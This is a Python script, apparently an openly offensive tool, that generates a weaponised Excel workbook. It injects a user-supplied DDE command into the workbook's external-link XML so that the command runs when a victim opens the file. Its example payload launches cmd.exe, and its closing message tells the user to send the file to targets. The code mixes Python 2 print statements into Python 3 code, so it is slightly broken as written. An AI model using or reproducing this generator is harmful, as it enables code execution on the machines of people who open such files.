from builtins import input # python3 support
import zipfile
import argparse
import os
import tempfile
import shutil
from lxml import etree

__version__ = "1.0"
__author__ = "0xdeadbeefJERKY"

"""
Overview:
Leverages the macro-less DDE code execution technique (described 
in the blog posts listed in the References section below) to
generate one malicious Excel file.

Usage:
Install dependencies:

    pip install -r requirements.txt

Insert a simple (unobfuscated) DDE command string into the 
payload document:

    python ddeexcel.py

This will generate one Excel file:

*out/payload-final.xlsx*
- Contains user-provided DDE payload/command string. 

References:
http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/
https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/
"""

def arg_parse():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser()
    parser.add_argument('--version', action='version', version='%(prog)s ' + __version__)
    results = parser.parse_args()
    
    return results

def gen_payload():
    # Prompt user for DDE payload
    payload = []
    arg1 = input("[-] Enter DDE payload argument #1: ")
    arg2 = input("[-] Enter DDE payload argument #2: ")
    arg3 = input("[-] Enter DDE payload argument #3 (press ENTER to omit): ")

    payload.append(arg1)
    payload.append(arg2)
    payload.append(arg3)  
  
    """
    # Example set of DDE arguments to form payload
    MSEXCEL
    \..\..\..\Windows\System32\cmd.exe
    /c calc.exe
    """
 
    print('[*] Selected DDE payload: {}'.format(payload[0] + "|" + payload[1] + " " + payload[2]))

    return payload

if __name__ == "__main__":
    # Create 'out' directory
    if not os.path.exists('out'):
        os.makedirs('out')
    
    # Set output file name and create zipfile object
    payload_out = "payload-final.xlsx"
    zfpay = zipfile.ZipFile('templates/payload.xlsx')
    
    payload = gen_payload()

    ddeService = payload[0]
    ddeTopic = payload[1] + " " + payload[2]

    # Define XML namespace
    excel_schema = "{http://schemas.openxmlformats.org/spreadsheetml/2006/main}"
 
    # Edit payload xl/externalLinks/externalLink1.xml to insert DDE payload
    docxml = zfpay.read('xl/externalLinks/externalLink1.xml')
    doctree = etree.fromstring(docxml)
    
    # Find 'externalLink' XML element and change DDE attributes (ddeService and ddeTopic) to DDE payload
    print('[*] Inserting DDE payload into {}/xl/externalLinks/externalLink1.xml...'.format(payload_out))
    for node in doctree.iter(tag=etree.Element):
        if "ddeLink" in node.tag:
            print node.tag
            print etree.tostring(node)
            node.attrib['ddeService'] = ddeService
            node.attrib['ddeTopic'] = ddeTopic
            print etree.tostring(doctree)
    
    # Create temp directory and extract payload.xlsx file to it
    tmp_dir_pay = tempfile.mkdtemp()
    zfpay.extractall(tmp_dir_pay)

    # Write modified xl/externalLinks/externalLink1.xml to temp directory for payload.xlsxdocx
    with open(os.path.join(tmp_dir_pay,'xl/externalLinks/externalLink1.xml'), 'w') as f:
        xmlstr = etree.tostring(doctree)
        f.write(xmlstr.decode())

    # Get a list of all the files in the original 
    filenames_pay = zfpay.namelist()

    # Now, create the new zip file and add all the files into the archive
    zfcopypay = 'out/' + payload_out

    with zipfile.ZipFile(zfcopypay, "w") as doc:
        for filename in filenames_pay:
            doc.write(os.path.join(tmp_dir_pay,filename), filename)

    # Remove temporary directories
    shutil.rmtree(tmp_dir_pay)

    print('[*] Payload generation complete! Delivery methods below:\n\t1. Send {} directly to your target(s).'.format(payload_out))
